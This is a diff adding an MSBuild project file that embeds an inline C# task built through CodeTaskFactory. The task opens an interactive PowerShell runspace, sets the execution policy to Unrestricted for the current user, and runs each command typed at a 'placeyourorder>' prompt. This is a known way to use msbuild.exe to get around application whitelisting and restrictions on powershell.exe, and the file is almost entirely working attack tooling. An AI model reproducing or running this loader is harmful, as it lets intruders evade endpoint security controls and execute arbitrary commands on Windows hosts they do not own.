@@ -1,0 +1,73 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="abcd">
+   <shevy />
+  </Target>
+    <UsingTask
+    TaskName="shevy"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+using System;
+using System.IO;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+using System.Text.RegularExpressions;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+                            
+public class shevy :  Task, ITask {
+	public override bool Execute() {
+		while(true) {
+			Console.Write("placeyourorder> ");
+			string x = Console.ReadLine();
+			try {
+				Console.WriteLine(shevyc(x));
+			}
+			catch (Exception e) {
+				Console.WriteLine(e.Message);
+			}
+			if (x=="exit") {
+				return true;
+			} else if (x.IndexOf("cd ", StringComparison.OrdinalIgnoreCase) >= 0) {
+				string dir = x.Substring(x.IndexOf("cd ", StringComparison.OrdinalIgnoreCase)+3);
+				dir = dir.Replace("\"", string.Empty).Trim();
+				try {
+					Directory.SetCurrentDirectory(dir);
+				}
+				catch (Exception e) {
+					Console.WriteLine( "The specified directory does not exist. {0}", e );
+				}
+			}
+		}
+	}
+	public static string shevyc(string order) {
+		Runspace r = RunspaceFactory.CreateRunspace();
+		r.Open();
+		RunspaceInvoke s = new RunspaceInvoke(r);
+		s.Invoke("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
+		Pipeline p = r.CreatePipeline();
+		p.Commands.AddScript(order);
+		p.Commands.Add("Out-String");
+		Collection<PSObject> results = p.Invoke();
+		r.Close();
+		StringBuilder sb = new StringBuilder();
+		foreach (PSObject obj in results) {
+			sb.Append(obj);
+		}
+		return sb.ToString().Trim();
+	}
+	public static void RunPSFile(string script) {
+		PowerShell ps = PowerShell.Create();
+		ps.AddScript(script).Invoke();
+	}
+}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
